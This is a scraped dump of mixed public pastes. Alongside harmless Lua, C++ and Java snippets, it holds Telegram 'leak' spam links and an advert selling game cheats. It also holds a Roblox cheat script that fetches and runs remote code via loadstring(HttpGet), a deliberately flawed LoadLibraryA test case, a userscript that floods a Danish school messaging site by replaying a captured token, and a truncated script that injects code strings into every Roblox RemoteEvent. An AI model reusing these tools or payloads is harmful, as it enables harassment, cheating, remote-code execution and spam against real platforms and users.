id,title,username,language,date,content
EfhbwqEs,telegram leaks❤️ EM,isthtwes,JavaScript,Wednesday 14th of May 2025 07:02:07 PM CDT," 
check it out at >> https://t.me/LucasL3AK/15  

y8uKpdLsWj
"
sCFs1mL2,DCMC EMC Generator,Grexxity,Lua,Wednesday 14th of May 2025 06:49:14 PM CDT,"-- DragonCraft EMC Generator - Optimized Version with Boot Screen

local leftName = ""projecte:condenser_mk2_5188""
local rightName = ""projecte:condenser_mk2_5189""
local giveExtraToLeft = false
local reserveCount = 64
local trackedEMCPerRMF = 10059784
local rodEMC = 1536

local totalTransferred = 0
local lastCheckTime = os.clock()

local monitor = peripheral.find(""monitor"")
monitor.setTextScale(0.5)
local monW, monH = monitor.getSize()

local function shortNumber(n)
    local abs = math.abs(n)
    if abs >= 1e12 then return string.format(""%.2fT"", n / 1e12)
    elseif abs >= 1e9 then return string.format(""%.2fB"", n / 1e9)
    elseif abs >= 1e6 then return string.format(""%.2fM"", n / 1e6)
    elseif abs >= 1e3 then return string.format(""%.2fK"", n / 1e3)
    else return tostring(math.floor(n)) end
end

local function centerText(text, y)
    local x = math.floor((monW - #text) / 2)
    monitor.setCursorPos(x, y)
    monitor.write(text)
end

local function drawBootScreen()
    monitor.setBackgroundColor(colors.black)
    monitor.clear()
    monitor.setTextColor(colors.white)
    centerText(""DragonCraft EMC Generator"", math.floor(monH / 2) - 1)
    centerText(""Booting... Please wait"", math.floor(monH / 2) + 1)
    os.sleep(5)
end

-- Find and cache the B.H.U. peripheral
local bhuName
local bhu
for _, name in ipairs(peripheral.getNames()) do
    if name:find(""industrialforegoing:black_hole_unit_tile"") then
        bhuName = name
        bhu = peripheral.wrap(name)
        break
    end
end

local function updatePowderCondensers()
    local found = {}
    for _, name in ipairs(peripheral.getNames()) do
        if name ~= leftName and name ~= rightName and name ~= bhuName then
            local type = peripheral.getType(name)
            if type == ""inventory"" and name:match(""^projecte:condenser_mk2_"") then
                table.insert(found, name)
            end
        end
    end
    powderCondensers = found
end

local function drawMonitor()
    monitor.clear()
    monitor.setTextColor(colors.white)
    centerText(""DragonCraft EMC Generator"", 1)

    local elapsed = os.clock() - lastCheckTime
    local totalEMCGenerated = totalTransferred * rodEMC
    local emcPerMinute = (elapsed > 0) and (totalEMCGenerated / (elapsed / 60)) or 0

    local macerators = #powderCondensers * 3
    local emcPerMacMin = (macerators > 0) and (emcPerMinute / macerators) or 0
    local emcPerMacHr = emcPerMacMin * 60
    local emcTotalHr = emcPerMinute * 60

    local perMin = {
        ""EMC: "" .. shortNumber(emcPerMinute),
        ""EMC/Mac: "" .. shortNumber(emcPerMacMin)
    }
    local perHr = {
        ""EMC: "" .. shortNumber(emcTotalHr),
        ""EMC/Mac: "" .. shortNumber(emcPerMacHr)
    }

    local rmfCount = 0
    local totalEMC = 0
    if bhu then
        for _, item in pairs(bhu.list()) do
            if item.name == ""projecte:rm_furnace"" then
                rmfCount = rmfCount + item.count
                totalEMC = totalEMC + (item.count * trackedEMCPerRMF)
            end
        end
    end

    local totals = {
        ""Powder Condensers: "" .. tostring(#powderCondensers),
        ""Macerators: "" .. tostring(macerators),
        ""RMFs Stored: "" .. tostring(rmfCount),
        ""Stored EMC: "" .. shortNumber(totalEMC)
    }

    drawBox(2, 3, perMin, ""Stats per Minute"")
    drawBox(2, 9, perHr, ""Stats per Hour"")
    drawBox(2, 15, totals, ""Total Stats"")

    monitor.setCursorPos(2, monH)
    monitor.setTextColor(colors.gray)
    monitor.write(""DCMC EMC v1.0"")
end


local function drawBox(x, y, contentLines, label)
    local w = 0
    for _, line in ipairs(contentLines) do
        if #line > w then w = #line end
    end
    w = math.max(w, #label + 4)
    local h = #contentLines + 2

    monitor.setBackgroundColor(colors.purple)
    for i = 0, h do
        monitor.setCursorPos(x, y + i)
        monitor.write(string.rep("" "", w + 4))
    end
    monitor.setCursorPos(x + 2, y)
    monitor.setTextColor(colors.white)
    monitor.write(label)
    monitor.setBackgroundColor(colors.black)
    monitor.setTextColor(colors.white)

    for i, line in ipairs(contentLines) do
        monitor.setCursorPos(x + 2, y + i + 1)
        monitor.write(line)
    end
end

drawBootScreen()
updatePowderCondensers()
drawMonitor()

local function transferBlazeRods(name)
    local inv = peripheral.wrap(name)
    if not inv then return end
    local totalRods = 0
    local rodSlots = {}

    for slot, item in pairs(inv.list()) do
        if item and item.name == ""minecraft:blaze_rod"" then
            totalRods = totalRods + item.count
            table.insert(rodSlots, { slot = slot, count = item.count })
        end
    end
    if totalRods <= reserveCount then return end

    local available = totalRods - reserveCount
    local half = math.floor(available / 2)
    local extra = available % 2
    local leftQty, rightQty = half, half
    if extra > 0 then
        if giveExtraToLeft then leftQty = leftQty + 1 else rightQty = rightQty + 1 end
        giveExtraToLeft = not giveExtraToLeft
    end

    for _, rodSlot in ipairs(rodSlots) do
        local slot, count = rodSlot.slot, rodSlot.count
        if leftQty > 0 then
            local toMove = math.min(leftQty, count)
            local moved = inv.pushItems(leftName, slot, toMove)
            leftQty = leftQty - moved
            totalTransferred = totalTransferred + moved
            count = count - moved
        end
        if rightQty > 0 and count > 0 then
            local toMove = math.min(rightQty, count)
            local moved = inv.pushItems(rightName, slot, toMove)
            rightQty = rightQty - moved
            totalTransferred = totalTransferred + moved
        end
        if leftQty <= 0 and rightQty <= 0 then break end
    end
end

local function drainRMFs()
    if not bhuName then return end
    for _, condName in ipairs({ leftName, rightName }) do
        local cond = peripheral.wrap(condName)
        if cond then
            for slot, item in pairs(cond.list()) do
                if item and item.name == ""projecte:rm_furnace"" then
                    cond.pushItems(bhuName, slot, item.count)
                end
            end
        end
    end
end

-- Main loop
local lastMonitorDraw = 0
local lastPeripheralScan = 0

while true do
    local now = os.clock()

    if now - lastPeripheralScan > 60 then
        updatePowderCondensers()
        lastPeripheralScan = now
    end

    for _, name in ipairs(powderCondensers) do
        transferBlazeRods(name)
    end

    drainRMFs()

    if now - lastMonitorDraw > 5 then
        drawMonitor()
        lastMonitorDraw = now
    end

    os.sleep(0.1)
end
"
8J1wuSAH,❤️private mehtod M3,isthtwes,JavaScript,Wednesday 14th of May 2025 06:32:04 PM CDT," 
check it out at >> https://t.me/LucasL3AK/15  

7tDuW1jZWY
"
NR4qFZ2D,fdsgdfh,miglss,C++,Wednesday 14th of May 2025 06:02:48 PM CDT,"void FunctionName_1(char * &data);

void FunctionName_2()
{
    char * data;
    char dataBuffer[100] = """";
    data = dataBuffer;
    FunctionName_1(data);
    {
        HMODULE hModule;
        hModule = LoadLibraryA(data);
        if (hModule != NULL)
        {
            FreeLibrary(hModule);
            printLine(""Library loaded and freed successfully"");
        }
        else
        {
            printLine(""Unable to load library"");
        }
    }
}
"
AuXL6tTh,Complete JavaScript training from A to Z (through practice),f0f077,JavaScript,Wednesday 14th of May 2025 05:58:42 PM CDT,"Complete JavaScript training from A to Z (through practice)
Learn JavaScript from the basics and progress to popular frameworks Angular, Vue & React
What you will learn
Discover the basics of JavaScript
Master important JavaScript concepts (types, objects, functions, syntax, etc.)
Understanding and manipulating JavaScript in the browser
Mastering Ajax and RESTFul Services
Manipulating page content with JavaScript
Know how to animate the graphic aspect with JavaScript
for more:https://linkrex.net/T7XbJjYzyk"
fPcrZHZj,fdgdfgdf,miglss,C++,Wednesday 14th of May 2025 05:54:41 PM CDT,"#ifndef OMITBAD

/* bad function declaration */
void badSource(char * &data);

void bad()
{
    char * data;
    char dataBuffer[100] = """";
    data = dataBuffer;
    badSource(data);
    {
        HMODULE hModule;
        /* POTENTIAL FLAW: If the path to the library is not specified, an attacker may be able to
         * replace his own file with the intended library */
        hModule = LoadLibraryA(data);
        if (hModule != NULL)
        {
            FreeLibrary(hModule);
            printLine(""Library loaded and freed successfully"");
        }
        else
        {
            printLine(""Unable to load library"");
        }
    }
}

#endif /* OMITBAD */
"
Y1vDAZU0,20 JavaScript Projects,f0f077,JavaScript,Wednesday 14th of May 2025 05:52:43 PM CDT,"20 JavaScript Projects
Improve your JavaScript skills.
What you will learn
The JavaScript language
Using APIs
Do really fun and educational projects
Use loops, conditions
for more:https://linkrex.net/UYlpaRl"
k7qj1rCb,Minas,ThegeekKnight16,C++,Wednesday 14th of May 2025 05:47:46 PM CDT,"#include <bits/stdc++.h>
using namespace std;
#pragma GCC optimize(""Ofast"")

void dfs(int v, vector<int> &marc, const vector<vector<pair<int, int>>> &grafo, int &qnt, int x)
{
    marc[v] = 1; --qnt;
    for (auto [viz, e] : grafo[v]) if (!marc[viz] && e != x) dfs(viz, marc, grafo, qnt, x);
}

void getMatters(int v, vector<int> &marc, const vector<vector<pair<int, int>>> &grafo, vector<int> &matters)
{
    marc[v] = 1;
    for (auto [viz, e] : grafo[v]) if (!marc[viz]) {matters[e] = 1; getMatters(viz, marc, grafo, matters);}
}

int main()
{
    ios_base::sync_with_stdio(false); cin.tie(NULL);
    int N, M; cin >> N >> M;
    array<vector<vector<pair<int, int>>>, 2> grafo; grafo[0].resize(N+1); grafo[1].resize(N+1); 
    vector<pair<int, int>> edges(M);
    for (int i = 0; i < M; i++) {auto &[x, y] = edges[i]; cin >> x >> y; grafo[0][x].emplace_back(y, i); grafo[1][y].emplace_back(x, i);}
    vector<int> matters(M), marc(N+1);
    getMatters(1, marc, grafo[0], matters); 
    fill(marc.begin(), marc.end(), 0);
    getMatters(1, marc, grafo[1], matters);

    vector<pair<int, int>> resp; resp.reserve(M);
    for (int i = 0; i < M; i++)
    {
        if (!matters[i]) continue;
        auto [x, y] = edges[i];
        vector<int> marc0(N+1, 0), marc1(N+1, 0); int qnt0 = N, qnt1 = N;
        dfs(1, marc0, grafo[0], qnt0, i); dfs(1, marc1, grafo[1], qnt1, i);
        if (qnt0 || qnt1) resp.emplace_back(x, y);
    }

    cout << resp.size() << '\n';
    for (auto [x, y] : resp) cout << x << "" "" << y << '\n';
}"
qZF21Gi7,Untitled,m1st4k3nnn,Lua,Wednesday 14th of May 2025 04:43:04 PM CDT,"-- Load the KR4K UI Library
local Library = loadstring(game:HttpGet(""https://pastebin.com/raw/AWhnUtQd""))()
local Window = Library.Window('KR4K Example')

-- Tabs
local RemoteTab = Window.CreateTab('Remote')
local MasteryTab = Window.CreateTab('Mastery')
local PlaytimeTab = Window.CreateTab('Playtime')
local FlavorTab = Window.CreateTab('Flavors')
local StorageTab = Window.CreateTab('Storage')
local FarmTab = Window.CreateTab('Farm')
local EggTab = Window.CreateTab('Eggs')

-- Script version label
local SCRIPT_VERSION = ""Script Version: 1.0.0""
print(SCRIPT_VERSION)
-- Variables to keep track of toggles
local sellBubbleEnabled = false
local blowBubbleEnabled = false
local autoBuyFlavorsEnabled = false
local autoBuyStorageEnabled = false
local autoPlaytimeEnabled = false
local farmEnabled = false
local autoHatchEnabled = false

-- Remote references
local RemoteEvent = game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.RemoteEvent
local RemoteFunction = game:GetService(""ReplicatedStorage"").Shared.Framework.Network.Remote.RemoteFunction

-- Helper: Move character to a position at a constant speed
local speed = 5 -- studs per second

local function moveTo(position, speed)
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local root = character:FindFirstChild(""HumanoidRootPart"")
    if not root then
        warn(""HumanoidRootPart not found!"")
        return
    end
    local distance = (root.Position - position).Magnitude
    local duration = distance / speed
    local startTime = tick()
    local startPos = root.Position
    while tick() - startTime < duration do
        local alpha = (tick() - startTime) / duration
        root.CFrame = CFrame.new(startPos:Lerp(position, alpha))
        task.wait()
    end
    root.CFrame = CFrame.new(position)
end

-- Fix: Add unlockIslands function
local function unlockIslands(worldName, islandNames)
    local worldsFolder = workspace:FindFirstChild(""Worlds"")
    if not worldsFolder then
        warn(""Worlds folder not found in workspace!"")
        return
    end
    local world = worldsFolder:FindFirstChild(worldName)
    if not world then
        warn(""World not found:"", worldName)
        return
    end
    local islandsFolder = world:FindFirstChild(""Islands"")
    if not islandsFolder then
        warn(""Islands folder not found in"", worldName)
        return
    end

    local islands = {}
    for _, islandName in ipairs(islandNames) do
        local island = islandsFolder:FindFirstChild(islandName)
        if island and island:FindFirstChild(""Island"") and island.Island:FindFirstChild(""UnlockHitbox"") then
            local hitbox = island.Island.UnlockHitbox
            table.insert(islands, {name = islandName, part = hitbox, y = hitbox.Position.Y})
        end
    end

    table.sort(islands, function(a, b)
        return a.y < b.y
    end)

    for _, data in ipairs(islands) do
        moveTo(data.part.Position + Vector3.new(0, 5, 0), speed)
        wait(0.5)
    end
end

-- Remote Tab
RemoteTab.CreateLabel(SCRIPT_VERSION)
RemoteTab.CreateDivider(""Unlock Worlds"")
RemoteTab.CreateButton(""Unlock The Overworld Islands"", function()
    unlockIslands(""The Overworld"", {
        ""Floating Island"", ""Outer Space"", ""The Void"", ""Twilight"", ""Zen""
    })
end)
RemoteTab.CreateButton(""Unlock Minigame Paradise Islands"", function()
    unlockIslands(""Minigame Paradise"", {
        ""Dice Island"", ""Minecart Forest"", ""Robot Factory""
    })
end)

RemoteTab.CreateDivider(""Bubble Automation"")
RemoteTab.CreateToggle(""Auto Sell Bubble (10s)"", function(state)
    sellBubbleEnabled = state
    if state then
        spawn(function()
            while sellBubbleEnabled do
                RemoteEvent:FireServer(""SellBubble"")
                wait(10)
            end
        end)
    end
end)
RemoteTab.CreateToggle(""Auto Blow Bubble (0.5s)"", function(state)
    blowBubbleEnabled = state
    if state then
        spawn(function()
            while blowBubbleEnabled do
                RemoteEvent:FireServer(""BlowBubble"")
                wait(0.5)
            end
        end)
    end
end)

RemoteTab.CreateDivider(""Wheel"")
RemoteTab.CreateButton(""Claim Free Wheel Spin"", function()
    RemoteEvent:FireServer(""ClaimFreeWheelSpin"")
end)
RemoteTab.CreateButton(""Spin The Wheel"", function()
    RemoteFunction:InvokeServer(""WheelSpin"")
end)

RemoteTab.CreateDivider(""Other"")
RemoteTab.CreateButton(""Delete GUI & Stop"", function()
    sellBubbleEnabled = false
    blowBubbleEnabled = false
    autoBuyFlavorsEnabled = false
    autoBuyStorageEnabled = false
    autoPlaytimeEnabled = false
    farmEnabled = false
    autoHatchEnabled = false
    Library:Destroy()
end)

-- Mastery Tab
MasteryTab.CreateDivider(""Mastery Upgrades"")
MasteryTab.CreateButton(""Upgrade Pets"", function()
    RemoteEvent:FireServer(""UpgradeMastery"", ""Pets"")
end)
MasteryTab.CreateButton(""Upgrade Buffs"", function()
    RemoteEvent:FireServer(""UpgradeMastery"", ""Buffs"")
end)
MasteryTab.CreateButton(""Upgrade Shops"", function()
    RemoteEvent:FireServer(""UpgradeMastery"", ""Shops"")
end)
MasteryTab.CreateButton(""Upgrade Minigames"", function()
    RemoteEvent:FireServer(""UpgradeMastery"", ""Minigames"")
end)

-- Playtime Tab
PlaytimeTab.CreateDivider(""Playtime Rewards"")
PlaytimeTab.CreateToggle(""Auto Claim Playtime (1-9)"", function(state)
    autoPlaytimeEnabled = state
    if state then
        spawn(function()
            while autoPlaytimeEnabled do
                for i = 1, 9 do
                    if not autoPlaytimeEnabled then break end
                    RemoteFunction:InvokeServer(""ClaimPlaytime"", i)
                    wait(0.5)
                end
                wait(10)
            end
        end)
    end
end)

-- Flavors Tab
local flavors = {
    ""Bubble Gum"", ""Blueberry"", ""Cherry"", ""Pizza"", ""Watermelon"", ""Chocolate"",
    ""Contrast"", ""Gold"", ""Lemon"", ""Donut"", ""Swirl"", ""Molten"", ""Abstract""
}
local selectedFlavor = flavors[1]

FlavorTab.CreateDivider(""Flavors"")
FlavorTab.CreateToggle(""Auto Buy Flavors (Every 3s)"", function(state)
    autoBuyFlavorsEnabled = state
    if state then
        spawn(function()
            while autoBuyFlavorsEnabled do
                for _, flavor in ipairs(flavors) do
                    if not autoBuyFlavorsEnabled then break end
                    RemoteEvent:FireServer(""GumShopPurchase"", flavor)
                    wait(0.5)
                end
                wait(3)
            end
        end)
    end
end)
FlavorTab.CreateDropdown(""Select Flavor"", flavors, function(selected)
    selectedFlavor = selected
end)
FlavorTab.CreateButton(""Buy Selected Flavor"", function()
    RemoteEvent:FireServer(""GumShopPurchase"", selectedFlavor)
end)

-- Storage Tab
local storageList = {
    ""Basic Gum"", ""Stretchy Gum"", ""Chewy Gum"", ""Epic Gum"", ""Ultra Gum"", ""Omega Gum"",
    ""XL Gum"", ""Mega Gum"", ""Cosmic Gum"", ""Quantum Gum"", ""Alien Gum"", ""Radioactive Gum"",
    ""Experiment #52"", ""Void Gum"", ""Robogum""
}

StorageTab.CreateDivider(""Storage Upgrades"")
StorageTab.CreateToggle(""Auto Buy Storage (Every 5s)"", function(state)
    autoBuyStorageEnabled = state
    if state then
        spawn(function()
            while autoBuyStorageEnabled do
                for _, storage in ipairs(storageList) do
                    if not autoBuyStorageEnabled then break end
                    RemoteEvent:FireServer(""GumShopPurchase"", storage)
                    wait(0.5)
                end
                wait(5)
            end
        end)
    end
end)
StorageTab.CreateButton(""Buy All Storage Upgrades"", function()
    for _, storage in ipairs(storageList) do
        RemoteEvent:FireServer(""GumShopPurchase"", storage)
        wait(0.2)
    end
end)

-- Farm Tab
FarmTab.CreateDivider(""Coin Farming"")
FarmTab.CreateToggle(""Auto Farm Closest Coin"", function(state)
    farmEnabled = state
    if state then
        spawn(function()
            while farmEnabled do
                local rendered = workspace:FindFirstChild(""Rendered"")
                if rendered then
                    local pickupsFolder = rendered:GetChildren()[13]
                    if pickupsFolder then
                        local coins = {}
                        for _, pickup in ipairs(pickupsFolder:GetChildren()) do
                            if pickup:IsA(""Model"") then
                                for _, part in ipairs(pickup:GetDescendants()) do
                                    if part:IsA(""BasePart"") then
                                        table.insert(coins, {model = pickup, part = part})
                                        break
                                    end
                                end
                            end
                        end
                        local player = game.Players.LocalPlayer
                        local character = player.Character or player.CharacterAdded:Wait()
                        local root = character:FindFirstChild(""HumanoidRootPart"")
                        while #coins > 0 and farmEnabled do
                            local closestIndex, closestDist = nil, math.huge
                            for i, coin in ipairs(coins) do
                                local dist = (root.Position - (coin.part.Position + Vector3.new(0, 5, 0))).Magnitude
                                if dist < closestDist then
                                    closestDist = dist
                                    closestIndex = i
                                end
                            end
                            if closestIndex then
                                local coin = coins[closestIndex]
                                local targetPos = coin.part.Position + Vector3.new(0, 5, 0)
                                moveTo(targetPos, speed)
                                table.remove(coins, closestIndex)
                                wait(0.2)
                            end
                        end
                    end
                end
                wait(2)
            end
        end)
    end
end)
FarmTab.CreateButton(""Farm All Coins Closest Order Once"", function()
    local rendered = workspace:FindFirstChild(""Rendered"")
    if rendered then
        local pickupsFolder = rendered:GetChildren()[13]
        if pickupsFolder then
            local coins = {}
            for _, pickup in ipairs(pickupsFolder:GetChildren()) do
                if pickup:IsA(""Model"") then
                    for _, part in ipairs(pickup:GetDescendants()) do
                        if part:IsA(""BasePart"") then
                            table.insert(coins, {model = pickup, part = part})
                            break
                        end
                    end
                end
            end
            local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            local root = character:FindFirstChild(""HumanoidRootPart"")
            while #coins > 0 do
                local closestIndex, closestDist = nil, math.huge
                for i, coin in ipairs(coins) do
                    local dist = (root.Position - (coin.part.Position + Vector3.new(0, 5, 0))).Magnitude
                    if dist < closestDist then
                        closestDist = dist
                        closestIndex = i
                    end
                end
                if closestIndex then
                    local coin = coins[closestIndex]
                    local targetPos = coin.part.Position + Vector3.new(0, 5, 0)
                    moveTo(targetPos, speed)
                    table.remove(coins, closestIndex)
                    wait(0.2)
                end
            end
        end
    end
end)

-- Eggs Tab
local overworldEggs = {
    ""Common Egg"", ""Spotted Egg"", ""Iceshard Egg"", ""Spikey Egg"", ""Magma Egg"",
    ""Crystal Egg"", ""Lunar Egg"", ""Void Egg"", ""Hell Egg"", ""Nightmare Egg"", ""Rainbow Egg""
}
local minigameEggs = {
    ""Snowman Egg"", ""Mining Egg"", ""Cyber Egg"", ""Underworld Egg""
}
local selectedOverworldEgg = overworldEggs[1]
local selectedMinigameEgg = minigameEggs[1]
local selectedWorld = ""The Overworld""

EggTab.CreateDivider(""Auto Egg Hatching"")
EggTab.CreateDropdown(""Select World"", {""The Overworld"", ""Minigame Paradise""}, function(world)
    selectedWorld = world
end)
EggTab.CreateDropdown(""Overworld Egg"", overworldEggs, function(selected)
    selectedOverworldEgg = selected
end)
EggTab.CreateDropdown(""Minigame Paradise Egg"", minigameEggs, function(selected)
    selectedMinigameEgg = selected
end)
EggTab.CreateToggle(""Start Hatching"", function(state)
    autoHatchEnabled = state
    if state then
        spawn(function()
            while autoHatchEnabled do
                local eggName
                if selectedWorld == ""The Overworld"" then
                    eggName = selectedOverworldEgg
                else
                    eggName = selectedMinigameEgg
                end
                RemoteEvent:FireServer(""HatchEgg"", eggName, 1)
                wait(1)
            end
        end)
    end
end)
"
c2nxLVLr,Ideas Needed!,NewBestPastebins,JavaScript,Wednesday 14th of May 2025 04:40:44 PM CDT,"Please comment some ideas for a fun script I could make, that would be nice for you to have. It can be as troll and weird as you want."
bXXw2Lwm,DETAILS,mrbug5,HTML,Wednesday 14th of May 2025 04:29:10 PM CDT,"📌GCASH PAYMENT UPDATED 
  GCASH # 09542376574
  NAME: JA***E J*B
⛔️ANTI BANNED 2025
🌟 EAGLEFIRE CF👍
    • WH/AIMBOT
🌟CROSSFIRE  🇵🇭
   💉  300/30 DAYS  WALLHACK + NO SMOKE 
   • 200/2 WEEKS
   • 100/6 DAYS 
   💯 SAFE FOR  MAIN ACCOUNT 👍 
🌟POINTBLANK / PRIVATE SERVER
  💉 WH / NO SMOKE 100/30 DAYS
💯 SAFE FOR  MAIN ACCOUNT 
   • ADD REQUEST AIMBOT PM/WITH WALLSHOT 
🌟POINTBLANK  🇵🇭 / PRIVATE SERVER 🌍
   • WH / NO SMOKE
   • MACRO SG/SNIPE  
   • WALLSHOT  
   • NO CLIP
   • AIMBOT 
   💯 SAFE FOR  MAIN ACCOUNT  👍 200 30/days
🌟BLOOD STRIKE 🌍
    💉  WALLHACK ONLY
     • 100 30DAYS
🌟BLACK SQUAD 🌍
   💉 WALLHACK ONLY/100 30days
     • 100 30DAYS
 💯  SAFE FOR  MAIN ACCOUNT  👍
🌟KNIVES OUT WH 🌍
   💉 WALLHACK & CHAMS
     •  100 30DAYS
    💯 SAFE FOR  MAIN ACCOUNT  👍"
wJJ97DnX,3280. Convert Date to Binary,BojidarDosev,Java,Wednesday 14th of May 2025 04:23:57 PM CDT,"import java.util.*;
import java.util.stream.Collectors;

public class Main {
    public static String convertDateToBinary(String date) {
        String binary = """";
        String[] split = date.split(""-"");
        int[] data = new int[split.length];

        for (int i = 0; i < split.length; i++) {
            data[i] = Integer.parseInt(split[i]);
        }

        for (int i = 0; i < data.length; i++) {
            String temp = """";
            while (data[i] != 0) {
                //get the reversed binary of the fisrt num (date)
                temp += data[i] % 2;
                data[i] /= 2;
            }
            //reverse the temp so it is a binary
            for (int j = temp.length()-1; j>=0 ;j--) {
                binary += temp.charAt(j);
            }
            //if the num is not the last, space them with -
            if(i!=data.length-1) binary += ""-"";
        }

        return binary;
    }

    public static void main(String[] args) {
        Scanner sc = new Scanner(System.in);
        String allowed = sc.nextLine();

        System.out.println(convertDateToBinary(allowed));
    }
}"
5rVQAN7a,Viggo Spammer,NewBestPastebins,JavaScript,Wednesday 14th of May 2025 03:58:30 PM CDT,"// ==UserScript==
// @name         Viggo Spammer V1 med Custom Payload
// @namespace    http://tampermonkey.net/
// @version      1.5
// @description  Genspil en hvilken som helst XHR request
// @author       You
// @match        https://aae.viggo.dk/Basic/Message/Inbox*
// @grant        GM_xmlhttpRequest
// @grant        GM_notification
// @run-at       document-end
// ==/UserScript==

(function() {
    'use strict';

    const createUI = () => {
        const uiContainer = document.createElement('div');
        uiContainer.style.width = '300px';
        uiContainer.style.transform = ""translateY(25%)"";
        uiContainer.style.position = 'fixed';
        uiContainer.style.top = '10px';
        uiContainer.style.right = '10px';
        uiContainer.style.backgroundColor = '#1a1a1a';
        uiContainer.style.color = '#f1f1f1';
        uiContainer.style.padding = '20px';
        uiContainer.style.borderRadius = '15px';
        uiContainer.style.boxShadow = '0 6px 12px rgba(0, 0, 0, 0.3)';
        uiContainer.style.zIndex = '9999';
        uiContainer.style.transition = 'transform 0.3s ease-in-out';
        uiContainer.style.fontFamily = ""'Arial', sans-serif"";
        uiContainer.style.display = 'none'; // Initially hidden

        const header = document.createElement('div');
        header.style.display = 'flex';
        header.style.alignItems = 'center';
        header.style.marginBottom = '15px';
        header.style.fontSize = '18px';
        header.innerHTML = '📬 <strong>Viggo Spammer</strong>';
        uiContainer.appendChild(header);

        const label = document.createElement('label');
        label.textContent = 'Antal beskeder: ';
        label.style.display = 'block';
        label.style.marginBottom = '5px';

        const inputCount = document.createElement('input');
        inputCount.type = 'number';
        inputCount.value = 1;
        inputCount.min = 1;
        inputCount.style.width = '100%';
        inputCount.style.padding = '10px';
        inputCount.style.borderRadius = '10px';
        inputCount.style.border = '1px solid #333';
        inputCount.style.marginBottom = '15px';
        inputCount.style.backgroundColor = '#2b2b2b';
        inputCount.style.color = '#f1f1f1';

        const labelPayload = document.createElement('label');
        labelPayload.textContent = 'Paste din beskeds payload her (cURL Bash): ';
        labelPayload.style.display = 'block';
        labelPayload.style.marginBottom = '5px';

        const textareaPayload = document.createElement('textarea');
        textareaPayload.style.width = '100%';
        textareaPayload.style.height = '120px';
        textareaPayload.style.padding = '10px';
        textareaPayload.style.borderRadius = '10px';
        textareaPayload.style.border = '1px solid #333';
        textareaPayload.style.marginBottom = '15px';
        textareaPayload.style.backgroundColor = '#2b2b2b';
        textareaPayload.style.color = '#f1f1f1';
        textareaPayload.style.resize = 'none';

        const button = document.createElement('button');
        button.textContent = '💥 Send Besked(er)';
        button.style.padding = '12px 18px';
        button.style.width = '100%';
        button.style.backgroundColor = '#4CAF50';
        button.style.border = 'none';
        button.style.color = 'white';
        button.style.borderRadius = '10px';
        button.style.cursor = 'pointer';
        button.style.fontSize = '16px';
        button.style.transition = 'background-color 0.3s ease-in-out';
        button.style.boxSizing = 'border-box';

        button.addEventListener('mouseover', () => {
            button.style.backgroundColor = '#45a049';
        });

        button.addEventListener('mouseout', () => {
            button.style.backgroundColor = '#4CAF50';
        });

        button.addEventListener('click', () => {
            const count = parseInt(inputCount.value);
            const payload = textareaPayload.value;
            sendMessages(count, payload);
        });

        uiContainer.appendChild(label);
        uiContainer.appendChild(inputCount);
        uiContainer.appendChild(labelPayload);
        uiContainer.appendChild(textareaPayload);
        uiContainer.appendChild(button);

        document.body.appendChild(uiContainer);

        const toggleButton = document.createElement('button');
        toggleButton.style.transform = ""translateY(80%)"";
        toggleButton.textContent = '🔽 Åben Spammer';
        toggleButton.style.position = 'fixed';
        toggleButton.style.top = '10px';
        toggleButton.style.right = '10px';
        toggleButton.style.backgroundColor = '#1a1a1a';
        toggleButton.style.color = '#f1f1f1';
        toggleButton.style.padding = '12px 18px';
        toggleButton.style.border = 'none';
        toggleButton.style.borderRadius = '10px';
        toggleButton.style.cursor = 'pointer';
        toggleButton.style.fontSize = '16px';
        toggleButton.style.transition = 'background-color 0.3s ease-in-out';
        toggleButton.style.boxSizing = 'border-box';

        toggleButton.addEventListener('click', () => {
            if (uiContainer.style.display === 'none') {
                uiContainer.style.display = 'block';
                toggleButton.textContent = '🔼 Luk Spammer';
            } else {
                uiContainer.style.display = 'none';
                toggleButton.textContent = '🔽 Åben Spammer';
            }
        });

        document.body.appendChild(toggleButton);
    };

    const sendMessages = (count, payload) => {
        const url = 'https://aae.viggo.dk/Basic/Message/SaveMessage';

        const data = parsePayload(payload);

        let requestsSent = 0;
        for (let i = 0; i < count; i++) {
            GM_xmlhttpRequest({
                method: 'POST',
                url: url,
                headers: {
                    'accept': '*/*',
                    'accept-language': 'da-DK,da;q=0.9,en-US;q=0.8,en;q=0.7',
                    'content-type': 'application/x-www-form-urlencoded',
                    'sec-ch-ua': '""Chromium"";v=""136"", ""Google Chrome"";v=""136"", ""Not.A/Brand"";v=""99""',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '""Windows""',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'x-request-by': 'ViggoAjax',
                    'origin': 'https://aae.viggo.dk',
                    'referer': 'https://aae.viggo.dk/Basic/Message/Folder/11',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36'
                },
                data: data,
                onload: function(response) {
                    requestsSent++;
                    console.log(`Message ${requestsSent} sent successfully!`);

                    // Display a notification after all requests are sent
                    if (requestsSent === count) {
                        GM_notification({
                            text: `${requestsSent} besked(er) er blevet sendt!`,
                            title: 'Viggo Spammer V1',
                            timeout: 4000
                        });
                    }
                },
                onerror: function(error) {
                    console.error('Error sending message:', error);
                }
            });
        }
    };

    const parsePayload = (payload) => {
        const parsed = new URLSearchParams(payload);

        const messageType = parsed.get('MessageType');
        const answerMessageId = parsed.get('AnswerMessageId');
        const users = parsed.get('users');
        const headline = parsed.get('headline');
        const contents = parsed.get('Contents');
        const verificationToken = parsed.get('__RequestVerificationToken');

        return `MessageType=${messageType}&AnswerMessageId=${answerMessageId}&users=${users}&ccusers=&bccusers=&headline=${headline}&Contents=${contents}&file=&AnswerId=0&Locked=False&__RequestVerificationToken=${verificationToken}`;
    };

    createUI();

})();

"
jN2t9Bte,Roblox Remotefunction script,Steamhesaproblox,RBScript,Wednesday 14th of May 2025 03:52:12 PM CDT,"-- Scanner Başlangıcı
local timeout = 5
local timer = 0

-- Remote tarama fonksiyonu
local function scanForRemote(parent)
    for _, child in pairs(parent:GetDescendants()) do
        if child:IsA(""RemoteEvent"") then
            pcall(function()
                child:FireServer([[
                    local folder = Instance.new('RemoteEvent')
